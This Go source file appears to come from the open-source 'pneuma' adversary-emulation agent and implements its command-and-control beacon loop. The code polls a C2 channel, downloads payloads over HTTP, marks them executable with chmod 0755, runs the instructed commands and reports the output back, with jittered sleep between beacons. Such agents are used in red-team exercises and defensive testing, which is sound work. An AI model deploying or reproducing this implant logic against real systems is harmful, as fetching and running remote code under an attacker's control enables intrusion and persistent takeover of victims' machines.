package sockets

import (
	"bytes"
	"errors"
	"github.com/preludeorg/pneuma/commands"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/preludeorg/pneuma/util"
)

func EventLoop(agent *util.AgentConfig, beacon util.Beacon) {
	util.CommunicationChannels[agent.Contact].SetProtocolConfiguration(agent)
	respBeacon := util.CommunicationChannels[agent.Contact].Communicate(agent, beacon)
	refreshBeacon(agent, &respBeacon)
	util.DebugLogf("C2 refreshed. [%s] agent at PID %d.", agent.Address, agent.Pid)
	EventLoop(agent, respBeacon)
}

func runLinks(tempB *util.Beacon, beacon *util.Beacon, agent *util.AgentConfig, delimiter string) {
	for _, link := range agent.StartInstructions(tempB.Links) {
		var payloadPath string
		var payloadErr error
		if len(link.Payload) > 0 {
			payloadPath, payloadErr = requestPayload(link.Payload)
		}
		if payloadErr == nil {
			response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
			link.Response = strings.TrimSpace(response) + delimiter
			link.Status = status
			link.Pid = pid
		} else {
			payloadErrorResponse(payloadErr, agent, &link)
		}
		beacon.Links = append(beacon.Links, link)
		agent.EndInstruction(link)
	}
}

func refreshBeacon(agent *util.AgentConfig, beacon *util.Beacon) {
	pwd, _ := os.Getwd()
	beacon.Sleep = agent.Sleep
	beacon.Range = agent.Range
	beacon.Pwd = pwd
	beacon.Target = agent.Address
	beacon.Executing = agent.BuildExecutingHash()
}

func requestPayload(target string) (string, error) {
	body, filename, code, err := requestHTTPPayload(target)
	if err != nil {
		return "", err
	}
	if code == 200 {
		workingDir := "./"
		path := filepath.Join(workingDir, filename)
		err = util.SaveFile(bytes.NewReader(body), path)
		if err != nil {
			return "", err
		}

		err = os.Chmod(path, 0755)
		if err != nil {
			return "", err
		}

		return path, nil
	}
	return "", errors.New("UNHANDLED PAYLOAD EXCEPTION")
}

func payloadErrorResponse(err error, agent *util.AgentConfig, link *util.Instruction) {
	link.Response = "Payload Error: " + strings.TrimSpace(err.Error())
	link.Status = 1
	link.Pid = agent.Pid
}

func jitterSleep(sleep int, beaconType string) {
	rand.Seed(time.Now().UnixNano())
	min := int(float64(sleep) * .90)
	max := int(float64(sleep) * 1.10)
	randomSleep := rand.Intn(max - min + 1) + min
	util.DebugLogf("[%s] Next beacon going out in %d seconds", beaconType, randomSleep)
	time.Sleep(time.Duration(randomSleep) * time.Second)
}
